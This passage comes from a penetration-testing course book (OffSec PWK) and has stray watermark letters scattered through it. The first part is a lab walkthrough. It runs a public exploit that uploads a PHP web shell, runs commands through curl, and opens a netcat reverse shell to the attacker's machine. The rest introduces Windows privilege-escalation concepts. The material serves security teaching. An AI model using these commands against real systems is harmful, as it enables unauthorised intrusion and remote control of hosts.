found credentials. The exploit arguments were determined from reading the source code, along
with the usage section of the script. Not all exploits have a usage section. Unlike this exploit,
some exploits require changing variables within the source code before execution.
kali@kali:~$ python3 50944.py -url http://192.168.50.11/project/ -u
PI:EMAIL -p AIDevCorp
You are not able to use the designated admin account because they do not have a
myAccount page.
The DateStamp is 2022-06-15 12:19
Backdoor uploaded at - > http://192.168.50.11/project/uploads/users/420919-
backdoor.php?cmd=whoami
Listing 366 - The exploit completed successfully with an uploaded file
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 469
Made in Morocco
Penetration Testing with Kali Linux
The output of the exploit produces an error, but further investigation indicates it worked. The
exploit uploaded a command shell to the projects/uploads/users/ directory. We can use curl to
verify if we have command execution with this PHP file.
kali@kali:~$ curl http://192.168.50.11/project/uploads/users/420919-
backdoor.php?cmd=whoami
www-data
Listing 367 - The PHP script was executed by the www-data system account
The whoami command returned www-data as the system user executing the PHP script. Now, we
can enumerate more information from this web shell inside our target. The goal is to get a reverse
shell into the machine, so let’s check if nc is installed on the target.
We need to modify our curl command to automatically encode our commands supplied to the
y
cmd variable of our web shell. We can use the --data-urlencode option to automatically URL-
encode our parameter.
k
kali@kali:~$ curl http://192.168.50.11/project/uploads/users/420919-backdoor.php --
data-urlencode "cmd=which nc"
s
/usr/bin/nc
Listing 368 - nc is instoalled on the target
We find that nc is installed on the target machine. Let’s create a netcat listener on port 6666 and
attempt to get a reverse shell from the targnet to our Kali machine.
kali@kali:~$ nc -lvnp 6666
listening on [any] 6666 ... i
Listing 369 - Wze have an active netcat listener running on port 6666
We now have an active netcat listener in our terminal. In another terminal session, let’s attempt a
netcat reverse shell using thDe web shell that was uploaded by our exploit.
kali@kali:~$ curl http://192.168.50.11/project/uploads/users/420919-backdoor.php --
data-urlencode "cmd=nc -nv 192.168.50.129 6666 -e /bin/bash"
Listing 370 - The reverse netcat shell is executed and the terminal session does not respond
The reverse shell is executed through the webshell uploaded by our exploit. Let’s switch to the
netcat listener terminal session to find out if a connection was established from the target.
kali@kali:~$ nc -lvnp 6666
listening on [any] 6666 ...
connect to [192.168.50.129] from (UNKNOWN) [192.168.50.11] 57956
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Listing 371 - The netcat reverse shell successfully connected to our Kali machine
The netcat reverse shell successfully connected to our Kali machine, and we are currently the
www-data user.
The idea of this section is to find the service/application and version of that service to find any
pre-existing exploits to compromise the software. Also, we must review the exploit code prior to
execution to avoid any malicious activity from infecting us or our employer for the penetration
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 470
Made in Morocco
Penetration Testing with Kali Linux
test. It is important that we gather any necessary information for the exploit usage details, such
as the login credentials we used with our exploit.
Let’s practice what we covered in the following exercises.
15.5 Wrapping Up
In this Module, we examined the risks associated with running code written by untrusted authors.
We also discussed various online resources that host exploit code for publicly-known
vulnerabilities as well as offline resources that do not require an internet connection. Finally, we
covered a scenario that shows how such online resources can be used to find public exploits for
software versions discovered during the enumeration phase against a target.
y
k
s
o
n
i
z
D
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 471
Made in Morocco
Penetration Testing with Kali Linux
16 Windows Privilege Escalation
In this Learning Module, we will cover the following Learning Units:
• Enumerating Windows
• Leveraging Windows Services
• Abusing other Windows components
During a penetration test, we often gain our initial foothold on a Windows system as an
unprivileged user. However, we usually need administrative privileges to search for sensitive
information in other users’ home directories, examine configuration files on the system, or extract
password hashes with Mimikatz.730 The process of elevating our privileges and access from
unprivileged to privileged is called Privilege Escalation.731 y
While this Module focuses on Windows, the next Module will explore privilege escalation
k
techniques on Linux systems. Once we’ve completed both, we will not only understand how the
security models and attack surfaces of the two operating systems differ, but also how we can
s
leverage privilege escalation vectors on each of them.
In this Module, we’ll begin with an introductioon to Windows privileges and access control
mechanisms. Then, we’ll cover how to establish situational awareness on the target system by
gathering information. Based on this information, we’ll perform various privilege escalation
n
attacks. First, we’ll search the system for sensitive information left by users and the OS. Next,
we’ll learn how to abuse Windows services to attempt privilege escalation attacks. Finally, we’ll
review other components of Windows, which allow us to elevate our privileges through Scheduled
i
Tasks.732 Finally, we’ll investigate the use of exploits.
z
16.1 Enumerating Windows
D
This Learning Unit covers the following Learning Objectives:
• Understand Windows privileges and access control mechanisms
• Obtain situational awareness
• Search for sensitive information on Windows systems
• Find sensitive information generated by PowerShell
• Become familiar with automated enumeration tools
Every target can be considered unique due to differences in OS versions, patch levels, system
configuration, etc. Therefore, it is important for us to understand how to obtain and leverage
information about the target system to achieve privilege escalation. To fully grasp the attack
vectors of this Module, we’ll first need to get familiar with the Windows privilege structure and
access control mechanisms.
730 (Github, 2022), https://github.com/gentilkiwi/mimikatz
731 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Privilege_escalation
732 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Windows_Task_Scheduler
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 472
Made in Morocco
Penetration Testing with Kali Linux
While it is very common to use technical attack vectors to achieve privilege escalation, it’s often
sufficient to merely review information that users and the system leave behind. A couple
examples are when a user stores passwords in a text file or Windows records the input of a
password in PowerShell. For attackers, this can be a gold mine that leads to higher privileges.
In this Learning Unit, we will start by discussing how Windows privileges and access control
mechanisms work. Then, we’ll explore methods to establish situational awareness on the system.
These methods provide vital information about a target system such as existing users, active
network connections, and running applications. Next, we’ll examine various areas in Windows
where we can search for sensitive information. Finally, we’ll review automated tools.
16.1.1 Understanding Windows Privileges and Access Control
Mechanisms
y
Privileges on the Windows operating system refer to the permissions of a specific account to
perform system-related local operations (e.g. modifying the filesystem or adding users). To grant
or deny these operations, Windows needs control mechaniksms to identify the source of the
operation and determine if the privileges for the operation are sufficient.
s
In this section, we’ll cover four different concepts and mechanisms: Security Identifier (SID),733
access token,734 Mandatory Integrity Control,735 and User Account Control.736
o
Windows uses a SID to identify entities. A SID is a unique value assigned to each entity, or
principal, that can be authenticated by Windows, such as users and groups. The SID for local
accounts and groups is generated by the Ln ocal Security Authority (LSA),737 and for domain users
and domain groups, it’s generated on a Domain Controller (DC). The SID cannot be changed and is
generated when the user or group is created.
i
z
Windows uses only the SID, not usernames, to identify principals for access
D
control management.
The SID string consists of different parts, delimited by “-”, and represented by the placeholders “S”,
“R”, “X”, and “Y” in the following listing. This representation is the fundamental structure of a SID.
S-R-X-Y
Listing 372 - SID representation
The first part is a literal “S”, which indicates that the string is a SID.
733 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/windows/security/identity-protection/access-
control/security-identifiers
734 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens
735 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control
736 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-
control/user-account-control-overview
737 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-
management/configuring-additional-lsa-protection
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 473
Made in Morocco
Penetration Testing with Kali Linux
“R” stands for revision and is always set to “1”, since the overall SID structure continues to be on
its initial version.
“X” determines the identifier authority. This is the authority that issues the SID. For example, “5” is
the most common value for the identifier authority. It specifies NT Authority and is used for local
or domain users and groups.
“Y” represents the sub authorities of the identifier authority. Every SID consists of one or more sub
authorities. This part consists of the domain identifier and relative identifier (RID). The domain
identifier is the SID of the domain for domain users, the SID of the local machine for local users,
and “32” for built-in principals. The RID determines principals such as users or groups.
The following listing shows an example SID of a local user on a Windows system:
S-1-5-21-1336799502-1441772794-948155058-1001
y
Listing 373 - SID representation
Listing 373 shows that the RID is 1001. Because the RID starts at 1000 for nearly all principals,
k
this implies that this is the second local user created on the system.
There are SIDs that have a RID under 1000, which arse called well-known SIDs.738 These SIDs
identify generic and built-in groups and users instead of specific groups and users. The following
listing contains some useful well-known SIDs in thoe context of privilege escalation.
S-1-0-0 Nobody
S-1-1-0 Everybodyn
S-1-5-11 Authenticated Users
S-1-5-18 Local System
S-1-5-domainidentifier-500 Adiministrator
Listing 3z74 - List of Well known SIDs on local machines
While we won’t directly work with SIDs in this Module, knowing how Windows identifies principals
D
is necessary to understand access tokens. Additionally, it’s vital in the upcoming Active Directory
Modules.
Now that we know how Windows identifies principals on a system, let’s discuss how Windows
determines whether to grant or deny operations. Once a user is authenticated, Windows
generates an access token that is assigned to that user. The token itself contains various pieces
of information that effectively describe the security context of a given user. The security context is
a set of rules or attributes that are currently in effect.
The security context of a token consists of the SID of the user, SIDs of the groups the user is a
member of, the user and group privileges, and further information describing the scope of the
token.
When a user starts a process or thread, a token will be assigned to these objects. This token,
called a primary token, specifies which permissions the process or threads have when interacting
with another object and is a copy of the access token of the user.
A thread can also have an impersonation token739 assigned. Impersonation tokens are used to
provide a different security context than the process that owns the thread. This means that the
738 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 474
Made in Morocco
Penetration Testing with Kali Linux
thread interacts with objects on behalf of the impersonation token instead of the primary token of
the process.
In addition to SIDs and tokens, Windows also implements what is known as Mandatory Integrity
Control. It uses integrity levels to control access to securable objects. We can think of these levels
as hierarchies of trust Windows has in a running application or securable object.
When processes are started or objects are created, they receive the integrity level of the principal
performing this operation. One exception is if an executable file has a low integrity level, the
process’s integrity level will also be low. A principal with a lower integrity level cannot write to an
object with a higher level, even if the permissions would normally allow them to do so.
From Windows Vista onward, processes run on four integrity levels:
- System: SYSTEM (kernel, ...)
y
- High: Elevated users
- Medium: Standard users
- Low: very restricted rights often used in sandboxed[^pkrivesc_win_sandbox] processes
or for directories storing temporary data
Listing 375 - Integrity Levels
s
We can display the integrity level of processes with Process Explorer740 for our current user with
whoami /groups, and for files with icacls.741
o
For example, the following figure shows two PowerShell processes on a Windows system in
Process Explorer. One started as a regular unser and the other as an administrative user.
i
Figurez 236: Different Integrity Levels of PowerShell
The PowerShell processes have the integrity level of High and Medium. Reviewing Listing 375, we
D
can infer that the High integrity level process is started by the administrative user and the Medium
integrity level process by the regular user.
Finally, another Windows security technology we need to consider is User Account Control (UAC).
UAC is a Windows security feature that protects the operating system by running most
applications and tasks with standard user privileges, even if the user launching them is an
Administrator. For this, an administrative user obtains two access tokens after a successful
logon. The first token is a standard user token (or filtered admin token), which is used to perform
all non-privileged operations. The second token is a regular administrator token. It will be used
when the user wants to perform a privileged operation. To leverage the administrator token, a
UAC consent prompt742 needs to be confirmed.
This concludes our brief introduction to Windows privileges and access control mechanisms. We
should now have a basic understanding of SIDs, access tokens, integrity levels, and UAC.
739 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/win32/secauthz/impersonation-tokens
740 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer
741 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls
742 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-
control/how-user-account-control-works
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 475
Made in Morocco
Penetration Testing with Kali Linux
Windows offers numerous other mechanisms to control access to securable objects. We’ll
discuss and demonstrate several more in this Module.
16.1.2 Situational Awareness
Now that we have a basic understanding of Windows privileges, we’ll cover various methods to
get situational awareness on a system. Let’s assume we used a client-side attack or exploited a
vulnerability to access a Windows system as an unprivileged user. Before we attempt to elevate
our privileges, we must obtain information about the system we are on.
This is a crucial step to better understand the nature of the compromised machine and discover
possible vectors for privilege escalation. However, it is often skipped or minimized by
inexperienced penetration testers since sifting through and interpreting a lot of information is not
as exciting as attacking services or machines. Experienced penetration testers know that by
gathering as much information as possible, they obtain valuable iynformation about the target
system they can use to create various actionable vectors to elevate their privileges.
k
There are several key pieces of information we should always obtain:
- Username and hostname s
- Group memberships of the current user
- Existing users and groups
o
- Operating system, version and architecture
- Network information
- Installed applications
n
- Running processes
Listing 376 - Information we should gather to obtain situational awareness
i
After we perform the enumeration steps to obtain this information, we will have a solid
z
understanding of our target system.
Let’s start gathering the information on the CLIENTWK220 system. In this example, we’ll assume
D
that we previously started a bind shell on port 4444 through a client-side attack.
If the connection to the bind shell in this or following sections is terminated, it